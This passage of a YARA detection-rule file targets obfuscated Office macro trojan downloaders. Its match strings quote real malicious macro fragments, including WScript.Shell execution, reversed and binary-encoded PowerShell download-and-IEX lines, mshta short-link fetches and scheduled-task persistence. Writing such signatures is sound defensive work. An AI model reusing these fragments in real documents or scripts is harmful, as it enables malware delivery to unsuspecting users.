    strings:
        $x_1_1 = {20 3d 20 45 6e 76 69 72 6f 6e 28 [0-53] 28 22 66 77 6a 73 45 6e 66 75 74 7a 54 22 29 29 20 26 20 45 6e 76 69 72 6f 6e 28 00 28 22 69 75 62 51 66 6e 70 49 22 29 29 20 26 20 41 70 70 6c 69 63 61 74 69 6f 6e 2e 50 61 74 68 53 65 70 61 72 61 74 6f 72 20 26 20 00 28 22 71 70 75 6c 74 66 45 22 29 20 26 20 41 70 70 6c 69 63 61 74 69 6f 6e 2e 50 61 74 68 53 65 70 61 72 61 74 6f 72 20 26 20 00 28 22 6d 6d 65 2f 66 6e 62 6f 66 6d 6a 67 22 29}  //weight: 1, accuracy: Low
        $x_1_2 = "DkasdaSS = \"rundll32\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_SS_2147754484_8
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.SS!MTB"
        threat_id = "2147754484"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "socialworld = oneday1.openandshut.Tag + oneday1.button.Tag" ascii //weight: 1
        $x_1_2 = {63 61 72 69 6e 74 65 72 66 61 63 65 5f 6e 61 6d 65 20 28 73 6f 66 74 63 6f 72 6e 65 72 29 [0-3] 53 68 65 6c 6c 20 69 5f 6e 61 6d 65}  //weight: 1, accuracy: Low
        $x_1_3 = "assas.Textfile" ascii //weight: 1
        $x_1_4 = {44 69 6d 20 43 6c 6f 73 65 62 61 72 20 41 73 20 4e 65 77 20 73 6f 63 69 61 6c [0-3] 43 6c 6f 73 65 62 61 72 2e 6f 70 65 6e 6d 6f 75 74 68}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_SS_2147754484_9
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.SS!MTB"
        threat_id = "2147754484"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "X`E`I|'' nioj- mj$;}))61,_$(61tniot::]trevnoc[(]rahc[{ hcaErof | )'_'(tilpS.srahCiicsa$=mj$;'92_72_37_A6_E2_F6_47_16_" ascii //weight: 1
        $x_1_2 = "=srahCiicsa" ascii //weight: 1
        $x_1_3 = "$ neddih elytSwo" ascii //weight: 1
        $x_1_4 = "llehsrew" ascii //weight: 1
        $x_1_5 = "Shell.Applic" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_SS_2147754484_10
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.SS!MTB"
        threat_id = "2147754484"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "CreateObject(\"ws\" & Mid(\"9cript.sh5\", 2, 8) & \"ell\").Run avoidobject, 0" ascii //weight: 1
        $x_1_2 = "avoidobject = tumrhulnttopcvcuy(avoidobject & theretrain)" ascii //weight: 1
        $x_1_3 = "theretrain = \" JY%Zt33mk3pk%86\\LyR3r6RxRtZg8q6.ReBkx6e" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_SS_2147754484_11
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.SS!MTB"
        threat_id = "2147754484"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Debug.Print vygvY3tf_9IAjiPb" ascii //weight: 1
        $x_1_2 = "= Len(Join(Array(\"Ie3xQkUYbsVgH5Dl8O03dHQAnMs" ascii //weight: 1
        $x_1_3 = "fkc2L01E7WcHniAcnGCuuRMCCbo = \"rIeEwGkUZyl0G" ascii //weight: 1
        $x_1_4 = "& \"Tv5uKY1mHrUffvM" ascii //weight: 1
        $x_1_5 = "Open Xx0KZNN_gPgxLpA_gmDdGeD For Binary As #CLng(" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_SS_2147754484_12
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.SS!MTB"
        threat_id = "2147754484"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= var2 + Left(kaza, 2) + Space(2) + handland2 + \"p://%\" + Halal + IDcard" ascii //weight: 1
        $x_1_2 = "Call Shell(calc, vbNormalFocus)" ascii //weight: 1
        $x_1_3 = "Halal = \"20%20%20%2020%2020%2020%2020%20@bi\" & String(1, \"t\") + \".\" + String(1, \"l\") + \"y/\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_SS_2147754484_13
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.SS!MTB"
        threat_id = "2147754484"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Application.SendKeys \"%(qtmstv){ENTER}\"" ascii //weight: 1
        $x_1_2 = "Err.Number = 1004" ascii //weight: 1
        $x_1_3 = "pth1 = Application.StartupPath & \"\\boosting.xls\"" ascii //weight: 1
        $x_1_4 = "Debug.Print ThisWorkbook.VBProject.VBComponents(\"ThisWorkbook\")" ascii //weight: 1
        $x_1_5 = ".SaveAs Filename:=pth1" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_SS_2147754484_14
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.SS!MTB"
        threat_id = "2147754484"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "ioyukiu = Chr(cdssf - 116)" ascii //weight: 1
        $x_1_2 = "CSDCDS = \"dcdv hgfn mjhgmj\"" ascii //weight: 1
        $x_1_3 = {3d 20 22 57 53 43 72 69 70 74 2e 73 68 65 6c 6c 22 0d 0a 53 65 74 20 [0-56] 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28}  //weight: 1, accuracy: Low
        $x_1_4 = {2e 52 75 6e 28 [0-53] 2c 20 [0-50] 29 0d 0a 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_5 = "gtergt = \"terg uyti gr dh jy fe" ascii //weight: 1
        $x_1_6 = "PDFName = Left(pptName, InStr(pptName, \".\")) & \"pdf" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_SS_2147754484_15
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.SS!MTB"
        threat_id = "2147754484"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = ".ShellExecute \"P\" + fd45cvv0, fgfjhfgfg, \"\", \"\", 0" ascii //weight: 1
        $x_1_2 = {53 65 74 20 [0-4] 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 53 68 65 6c 6c 2e 41 70 70 6c 69 63 61 74 69 6f 6e 22 29}  //weight: 1, accuracy: Low
        $x_1_3 = {50 72 69 76 61 74 65 20 53 75 62 20 44 6f 63 75 6d 65 6e 74 5f 4f 70 65 6e 28 29 [0-3] 27 4d 73 67 42 6f 78 27 4d 73 67 42 6f 78}  //weight: 1, accuracy: Low
        $x_1_4 = {49 6e 20 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 42 75 69 6c 74 49 6e 44 6f 63 75 6d 65 6e 74 50 72 6f 70 65 72 74 69 65 73 [0-3] 49 66 20 [0-8] 2e 4e 61 6d 65 20 3d 20 22 43 6f 6d 6d 65 6e 74 73 22 20 54 68 65 6e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_SS_2147754484_16
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.SS!MTB"
        threat_id = "2147754484"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 22 57 53 43 72 69 70 74 2e 73 68 65 6c 6c 22 [0-3] 53 65 74 20 71 75 78 73 66 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 7a 61 63 6a 6b 6b 6b 68 7a 62 71 73 73 62 6a 79 78 69 29}  //weight: 1, accuracy: Low
        $x_1_2 = "tftqc = quxsf.Run(poeavdgiljitfoztzmkhllzvamkoh, bybupsb)" ascii //weight: 1
        $x_1_3 = "ioyukiu = Chr(cdssf - 116)" ascii //weight: 1
        $x_1_4 = "hff = Chr(bgfbg - 114)" ascii //weight: 1
        $x_2_5 = ".Run(sxflosjwwjnoagpeqlwink, vikwqyharrkvnimmviqtphxhxpoxdysevtj)" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (
            ((3 of ($x_1_*))) or
            ((1 of ($x_2_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Obfuse_SS_2147754484_17
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.SS!MTB"
        threat_id = "2147754484"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {43 72 65 61 74 65 50 72 6f 63 65 73 73 41 28 75 72 6c 2c 20 64 75 72 6c 2c 20 30 2c 20 30 2c 20 46 61 6c 73 65 2c 20 [0-9] 2c 20 30 2c 20 22 43 3a 5c 22 2c 20 73 69 2c 20 70 69 29 20 54 68 65 6e}  //weight: 1, accuracy: Low
        $x_1_2 = {53 65 74 20 44 44 46 75 6e 63 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-53] 28 22 75 64 66 6b 63 50 6e 66 75 74 7a 54 66 6d 6a 47 2f 68 6f 6a 75 71 6a 73 64 54 22 29 29}  //weight: 1, accuracy: Low
        $x_1_3 = {45 78 69 73 74 73 20 3d 20 44 69 72 28 [0-53] 28 22 7a 73 70 75 64 66 73 6a 65 71 6e 75 5d 64 6a 6d 63 76 51 5d 74 73 66 74 56 5d 3b 44 22 29 2c 20 76 62 44 69 72 65 63 74 6f 72 79 29}  //weight: 1, accuracy: Low
        $x_1_4 = {64 2e 43 72 65 61 74 65 46 6f 6c 64 65 72 20 [0-53] 28 22 7a 73 70 75 64 66 73 6a 65 71 6e 75 5d 64 6a 6d 63 76 51 5d 74 73 66 74 56 5d 3b 44 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_SS_2147754484_18
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.SS!MTB"
        threat_id = "2147754484"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "CreateObject(fuckzargus).Exec luli1 + luli2" ascii //weight: 1
        $x_1_2 = "yazeed9 = \"3\" + \"0\" + \"9\"" ascii //weight: 1
        $x_1_3 = "luli2 = yazeed9 + yazeed10 + yazeed12" ascii //weight: 1
        $x_1_4 = "yazeed10 = \"4\" + \"8\" + \"@\" + \"a" ascii //weight: 1
        $x_1_5 = "yazeed12 = \"dnjks" ascii //weight: 1
        $x_1_6 = "yazeed12 = \"fdsadavcxghahkhs\" + \"asdjdrsaad" ascii //weight: 1
        $x_1_7 = "yazeed12 = \"fddashdjksaasx'\" + \"asdgbsad" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (5 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_SS_2147754484_19
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.SS!MTB"
        threat_id = "2147754484"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "8"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 65 74 20 [0-15] 5f [0-15] 20 3d 20 47 65 74 4f 62 6a 65 63 74 28 [0-112] 29 2e 53 70 61 77 6e 49 6e 73 74 61 6e 63 65 5f}  //weight: 1, accuracy: Low
        $x_1_2 = ".ShowWindow = CLng((" ascii //weight: 1
        $x_1_3 = {23 45 6e 64 20 49 66 [0-4] 50 72 69 76 61 74 65 20 43 6f 6e 73 74 20 [0-15] 5f [0-15] 5f [0-15] 20 41 73 20 4c 6f 6e 67 20 3d 20 26 48 31 30 32}  //weight: 1, accuracy: Low
        $x_1_4 = {44 65 62 75 67 2e 50 72 69 6e 74 20 [0-10] 5f}  //weight: 1, accuracy: Low
        $x_1_5 = ")) * Rnd + CLng((" ascii //weight: 1
        $x_1_6 = {4f 70 65 6e 20 [0-53] 20 46 6f 72 20 42 69 6e 61 72 79 20 41 73 20 23 43 4c 6e 67 28 28 4e 6f 74}  //weight: 1, accuracy: Low
        $x_1_7 = ", Asc(Left$(Mid$(" ascii //weight: 1
        $x_1_8 = "Alias \"PostMessageA\" (ByVal" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_SS_2147754484_20
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.SS!MTB"
        threat_id = "2147754484"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "oWordDoc.SaveAs sPath + m_sDocPrefix + CStr(i) + \".doc\"" ascii //weight: 1
        $x_1_2 = "Set Gotchas = Wildcard.CreateFolder(\"C:\\Required\\occurs\")" ascii //weight: 1
        $x_1_3 = "Set ASCIIfile = Wildcard.opentextfile(\"C:\\Required\\DOMDocument.vb\" + \"s\", 8, 1)" ascii //weight: 1
        $x_1_4 = "Wildcard.Exec \"explorer.exe C:\\Required\\DOMDocument.vb\" + \"s\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_SS_2147754484_21
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.SS!MTB"
        threat_id = "2147754484"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "WshShell = CreateObject(\"WScript.Shell\")" ascii //weight: 1
        $x_1_2 = "UserProfile = UserProfile & Chr(Asc(x) - 1)" ascii //weight: 1
        $x_1_3 = "WshShell.SpecialFolders(\"Templates\")" ascii //weight: 1
        $x_1_4 = "m974e3e334b64ac13b6dec997fbabf21f = \"naiveremove\"" ascii //weight: 1
        $x_1_5 = {2e 4f 70 65 6e 20 22 67 65 74 22 2c 20 44 65 63 72 79 70 74 28 22 71 7e 7e 7a 47 3c 3c 78 73 76 6e 77 73 [0-2] 73 7e}  //weight: 1, accuracy: Low
        $x_1_6 = {3d 20 53 70 65 63 69 61 6c 50 61 74 68 20 2b 20 44 65 63 72 79 70 74 28 22 69 [0-15] 3b 6e [0-2] 6e 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_SS_2147754484_22
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.SS!MTB"
        threat_id = "2147754484"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= \"/%911%911%911%911%911@j.mp\\kasdasjasjdoasdasasdkodsdskdd" ascii //weight: 1
        $x_1_2 = "= \"/%909123id%909123id%90912%909123id%909123id%90912%909123id%909123id%909123id%909123id%909123id@j.mp\\dsajosd6789hjkaxbnmzcx" ascii //weight: 1
        $x_1_3 = "= \"/%909123id%909123id%90912%909123id%909123id%90912%909123id%909123id%909123id%909123id%909123id@j.mp\\xcvzhbcftrdsahjaksduhjasxdhkzc" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_SS_2147754484_23
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.SS!MTB"
        threat_id = "2147754484"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "8"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 43 68 72 57 28 43 4c 6e 67 28 28 [0-15] 20 26 20 43 68 72 57 28 43 4c 6e 67 28 28}  //weight: 1, accuracy: Low
        $x_1_2 = {26 20 43 68 72 28 43 4c 6e 67 28 28 [0-3] 20 58 6f 72 20 [0-3] 29 29 29 20 26 20 43 68 72 57 28 43 4c 6e 67 28 28}  //weight: 1, accuracy: Low
        $x_1_3 = {53 65 74 20 73 65 72 76 69 63 65 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 53 63 68 65 64 75 6c 65 2e 53 65 72 76 69 63 65 22 29 [0-3] 43 61 6c 6c 20 73 65 72 76 69 63 65 2e 43 6f 6e 6e 65 63 74 [0-3] 44 69 6d 20 72 6f 6f 74 46 6f 6c 64 65 72 [0-3] 53 65 74 20 72 6f 6f 74 46 6f 6c 64 65 72 20 3d 20 73 65 72 76 69 63 65 2e 47 65 74 46 6f 6c 64 65 72 28 43 68 72 28 39 32 29 29}  //weight: 1, accuracy: Low
        $x_1_4 = "Call rootFolder." ascii //weight: 1
        $x_1_5 = {53 65 74 20 41 63 74 69 6f 6e 20 3d 20 74 61 73 6b 44 65 66 69 6e 69 74 69 6f 6e 2e 41 63 74 69 6f 6e 73 2e 43 72 65 61 74 65 28 41 63 74 69 6f 6e 54 79 70 65 45 78 65 63 29 [0-3] 41 63 74 69 6f 6e 2e 50 61 74 68 20 3d 20}  //weight: 1, accuracy: Low
        $x_1_6 = {53 75 62 20 57 6f 72 6b 62 6f 6f 6b 5f 4f 70 65 6e 28 29 [0-21] 20 3d 20 28 4d 6f 64 75 6c 65 31 2e [0-21] 28 29 29 [0-3] 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_7 = {41 63 74 69 6f 6e 2e 41 72 67 75 6d 65 6e 74 73 20 3d 20 4d 6f 64 75 6c 65 32 2e [0-48] 28 [0-10] 5f [0-10] 29 20 26 20 4d 6f 64 75 6c 65 ?? 2e [0-15] 5f}  //weight: 1, accuracy: Low
        $x_1_8 = "))) & Chr(CLng((57 And 51))) & Chr(CLng((" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_SS_2147754484_24
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.SS!MTB"
        threat_id = "2147754484"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "01101000,01110100,01110100,01110000,00111010,00101111,00101111,00110001,00111001,00110010,00101110,00110010,00110001,00110000,00101110,00110010,00110001,00110100,00101110,00110010,00110010,00110001" ascii //weight: 2
        $x_1_2 = "00101111,01100110,01101111,01101110,01110100,00101110,01100101,01111000,01100101" ascii //weight: 1
        $x_1_3 = "00101111,01110010,01100101,01101101,01101001,01110100,00101110,01100101,01111000,01100101" ascii //weight: 1
        $x_1_4 = "[System.Text.Encoding]::UTF8.GetString([System.Convert]::ToInt32($_,2)) };[system.String]::Join('', $v78df0)|IEX***new:13709620-C279-11CE-A49E-444553540000" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_2_*) and 2 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Obfuse_SMT_2147754546_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.SMT!MTB"
        threat_id = "2147754546"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 53 74 72 52 65 76 65 72 73 65 28 22 22 22 [0-37] 5c 70 6d 2e 6a 5c 5c 3a 73 70 74 74 68 22 22 22 22 20 20 20 20 20 20 61 74 68 73 6d 22 22 22 29}  //weight: 1, accuracy: Low
        $x_1_2 = {43 61 6c 6c 20 53 68 65 6c 6c 28 [0-10] 2c 20 31 29}  //weight: 1, accuracy: Low
        $x_1_3 = "Sub Calculator_Click()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PRF_2147754689_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PRF!MTB"
        threat_id = "2147754689"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "CreateObject(\"WScript.shell\")" ascii //weight: 1
        $x_1_2 = "nnq.novonordisk.com\\web\\NNSOPAddIn\\QualityDocumentAddIn\\setup.exe" ascii //weight: 1
        $x_1_3 = {2e 52 75 6e 20 28 [0-25] 29}  //weight: 1, accuracy: Low
        $x_1_4 = ".\\root\\default:StdRegProv" ascii //weight: 1
        $x_1_5 = {2e 52 65 67 44 65 6c 65 74 65 20 28 [0-15] 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_KC_2147754926_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.KC!MTB"
        threat_id = "2147754926"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= (\"W\" + \"S\" + \"c\" + \"ript.Shell\")" ascii //weight: 1
        $x_1_2 = {3d 20 53 74 72 52 65 76 65 72 73 65 28 22 22 22 64 27 2a 27 [0-25] 27 2a 27 64 27 2a 27 64 5c 70 27 2a 27 2e 6a 5c 5c 3a 70 74 74 68 22 22 22 22 61 74 68 73 27 2a 27 22 22 22 29}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 52 65 70 6c 61 63 65 28 [0-10] 2c 20 22 27 2a 27 22 2c 20 22 6d 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Av4gsiPl_3.glvg3XItpsALCu87_gp2K8AHee5im" ascii //weight: 1
        $x_1_2 = "mk_ll = Chr(hf - 61)" ascii //weight: 1
        $x_1_3 = "Im = Im &" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "pL_EHxmWz_VCD_DwXWo.Lg_O_qfOKeZhaGhFJGfQlHtB5" ascii //weight: 1
        $x_1_2 = "gf_9 = Chr(as_w - 43)" ascii //weight: 1
        $x_1_3 = ".Run(" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_BK_2147755308_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.BK!MTB"
        threat_id = "2147755308"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = ".Run(IBSY_al4mysdD1rMJJL8u_GXee_KjngNMZr" ascii //weight: 1
